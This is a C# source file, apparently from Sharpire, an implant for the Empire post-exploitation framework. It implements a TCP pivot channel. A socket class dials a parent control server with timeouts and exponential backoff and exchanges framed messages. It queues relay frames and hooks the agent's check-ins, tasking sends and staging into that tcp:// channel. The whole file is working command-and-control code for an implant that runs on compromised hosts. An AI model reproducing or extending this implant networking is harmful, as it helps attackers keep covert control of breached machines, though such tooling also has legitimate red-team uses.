using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Sharpire
{
    // Child side of the v2 tcp pivot: one synchronised socket to the parent,
    // redialled inside the lock after any failure.
    internal sealed class PivotConn
    {
        private const int DialTimeoutMs = 10000;
        private const int IoTimeoutMs = 120000;
        private const int LockTimeoutMs = 150000;
        private const int BackoffStartSec = 1;
        private const int BackoffMaxSec = 30;

        private static readonly object InstanceLock = new object();
        private static PivotConn _instance;

        private readonly string _host;
        private readonly int _port;
        private readonly SemaphoreSlim _lock = new SemaphoreSlim(1, 1);
        private TcpClient _client;
        private NetworkStream _stream;
        private DateTime _nextDial = DateTime.MinValue;
        private int _backoffSec = BackoffStartSec;

        // Relay frames received alongside replies; consumed by a later task.
        internal readonly List<byte[]> PendingRelays = new List<byte[]>();

        internal PivotConn(string host, int port)
        {
            _host = host;
            _port = port;
        }

        // Returns the shared connection for the given tcp:// control server.
        internal static PivotConn For(string host, int port)
        {
            lock (InstanceLock)
            {
                if (_instance == null || _instance._host != host || _instance._port != port)
                {
                    _instance = new PivotConn(host, port);
                }
                return _instance;
            }
        }

        // Parses tcp://host:port[/hop]. Returns false when not a tcp:// address.
        internal static bool TryParse(string server, out string host, out int port, out string hop)
        {
            host = null;
            port = 0;
            hop = "";
            if (server == null || !server.StartsWith("tcp://", StringComparison.OrdinalIgnoreCase))
                return false;
            string rest = server.Substring(6);
            int slash = rest.IndexOf('/');
            if (slash >= 0)
            {
                hop = rest.Substring(slash + 1).Trim('/');
                rest = rest.Substring(0, slash);
            }
            int colon = rest.LastIndexOf(':');
            if (colon <= 0) return false;
            host = rest.Substring(0, colon).Trim('[', ']');
            return int.TryParse(rest.Substring(colon + 1), out port) && port > 0 && port < 65536;
        }

        // Sends one frame and returns the batch's kind=0 reply body, or an
        // empty array when the lock times out. Throws on I/O failure after
        // dropping the stream so the next call redials.
        // Swap the relay backlog out under the connection lock.
        internal List<byte[]> TakePendingRelays()
        {
            List<byte[]> taken = new List<byte[]>();
            if (!_lock.Wait(LockTimeoutMs)) return taken;
            try
            {
                taken.AddRange(PendingRelays);
                PendingRelays.Clear();
            }
            finally
            {
                _lock.Release();
            }
            return taken;
        }

        internal byte[] Exchange(byte kind, byte[] hop, byte[] body)
        {
            if (!_lock.Wait(LockTimeoutMs))
            {
                return new byte[0];
            }
            try
            {
                EnsureConnected();
                try
                {
                    byte[] frame = V2Frame.Encode(kind, 0, hop, body);
                    _stream.Write(frame, 0, frame.Length);
                    _stream.Flush();
                    V2Frame.Batch batch = V2Frame.ReadBatch(RecvExact);
                    if (batch.relayFrames != null && batch.relayFrames.Count > 0)
                    {
                        PendingRelays.AddRange(batch.relayFrames);
                    }
                    return batch.reply ?? new byte[0];
                }
                catch (Exception)
                {
                    Drop();
                    throw;
                }
            }
            finally
            {
                _lock.Release();
            }
        }

        private byte[] RecvExact(int n)
        {
            byte[] buf = new byte[n];
            int off = 0;
            while (off < n)
            {
                int r = _stream.Read(buf, off, n - off);
                if (r <= 0) throw new System.IO.IOException("pivot connection closed");
                off += r;
            }
            return buf;
        }

        private void EnsureConnected()
        {
            if (_client != null && _stream != null) return;

            DateTime now = DateTime.UtcNow;
            if (now < _nextDial)
            {
                throw new System.IO.IOException("pivot redial backoff");
            }

            TcpClient c = new TcpClient();
            try
            {
                // .NET 4.0 target has no ConnectAsync; BeginConnect + a 10 s wait is equivalent.
                IAsyncResult ar = c.BeginConnect(_host, _port, null, null);
                if (!ar.AsyncWaitHandle.WaitOne(DialTimeoutMs, false))
                {
                    throw new System.IO.IOException("pivot dial timeout");
                }
                c.EndConnect(ar);
                c.NoDelay = true;
                c.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
                c.SendTimeout = IoTimeoutMs;
                c.ReceiveTimeout = IoTimeoutMs;
            }
            catch (Exception)
            {
                try { c.Close(); } catch (Exception) { }
                _nextDial = DateTime.UtcNow.AddSeconds(_backoffSec);
                _backoffSec = Math.Min(_backoffSec * 2, BackoffMaxSec);
                throw;
            }
            _client = c;
            _stream = c.GetStream();
            _backoffSec = BackoffStartSec;
            _nextDial = DateTime.MinValue;
        }

        private void Drop()
        {
            try { if (_stream != null) _stream.Close(); } catch (Exception) { }
            try { if (_client != null) _client.Close(); } catch (Exception) { }
            _stream = null;
            _client = null;
        }
    }

    partial class Coms
    {
        private PivotConn PivotFor(out string hop)
        {
            string host;
            int port;
            string server = sessionInfo.GetControlServers()[ServerIndex];
            if (!PivotConn.TryParse(server, out host, out port, out hop)) return null;
            return PivotConn.For(host, port);
        }

        partial void TryPivotGet(ref byte[] result, ref bool handled)
        {
            string hop;
            PivotConn conn = PivotFor(out hop);
            if (conn == null) return;
            handled = true;
            try
            {
                byte[] routingPacket = NewRoutingPacket(null, 4);
                result = conn.Exchange(0, new byte[0], routingPacket);
            }
            catch (Exception)
            {
                MissedCheckins++;
                result = new byte[0];
            }
        }

        partial void TryPivotSend(byte[] routingPacket, ref bool handled)
        {
            string hop;
            PivotConn conn = PivotFor(out hop);
            if (conn == null) return;
            handled = true;
            try
            {
                conn.Exchange(1, new byte[0], routingPacket);
            }
            catch (Exception)
            {
                MissedCheckins++;
            }
        }
    }

    partial class EmpireStager
    {
        partial void TryPivotStagerExchange(byte[] routingPacket, ref byte[] response, ref bool handled)
        {
            string host;
            int port;
            string hop;
            if (!PivotConn.TryParse(sessionInfo.GetControlServers().First(), out host, out port, out hop)) return;
            handled = true;
            // Staging failures propagate, as the HTTP path's WebException does.
            response = PivotConn.For(host, port).Exchange(2, Encoding.UTF8.GetBytes(hop), routingPacket);
        }

        private bool IsPivotServer()
        {
            return sessionInfo.GetControlServers().First().StartsWith("tcp://", StringComparison.OrdinalIgnoreCase);
        }
    }
}
